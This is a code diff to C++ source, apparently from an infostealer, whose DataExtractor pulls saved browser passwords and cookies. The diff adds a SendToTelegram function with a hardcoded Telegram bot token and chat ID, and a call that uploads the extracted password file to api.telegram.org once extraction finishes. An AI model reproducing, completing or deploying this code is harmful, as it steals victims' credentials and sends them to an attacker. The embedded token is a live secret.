@@ -8,6 +8,8 @@
 #include <sstream>
 #include <iomanip>
 #include <map>
+#include <wininet.h>
+#pragma comment(lib, "wininet.lib")
 
 namespace Payload {
 
@@ -177,6 +179,51 @@ namespace Payload {
             m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
         }
     }
+static void SendToTelegram(const std::filesystem::path& filePath) {
+    std::string token = "8515562419:AAHxH4DFLRjALGstuM3S5sJbLqVqc3OxcG4";
+    std::string chatId = "8362360513";
+
+    std::ifstream file(filePath, std::ios::binary);
+    if (!file) return;
+    std::string fileData((std::istreambuf_iterator<char>(file)),
+                          std::istreambuf_iterator<char>());
+
+    std::string boundary = "----FormBoundary7MA4YWxkTrZu0gW";
+    std::string body = "--" + boundary + "\r\n";
+    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
+    body += chatId + "\r\n";
+    body += "--" + boundary + "\r\n";
+    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + filePath.filename().string() + "\"\r\n";
+    body += "Content-Type: application/octet-stream\r\n\r\n";
+    body += fileData + "\r\n";
+    body += "--" + boundary + "--\r\n";
+
+    std::string contentType = "multipart/form-data; boundary=" + boundary;
+    std::string url = "/bot" + token + "/sendDocument";
+
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return;
+
+    HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org",
+        INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) { InternetCloseHandle(hInternet); return; }
+
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", url.c_str(),
+        NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+    if (!hRequest) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return;
+    }
+
+    HttpSendRequestA(hRequest, contentType.c_str(), -1,
+        (LPVOID)body.c_str(), (DWORD)body.size());
+
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+}
+
 
     void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
         sqlite3_stmt* stmt;
@@ -214,6 +261,7 @@ namespace Payload {
             }
             out << "]";
             m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
+            SendToTelegram(outFile);
         }
     }
 
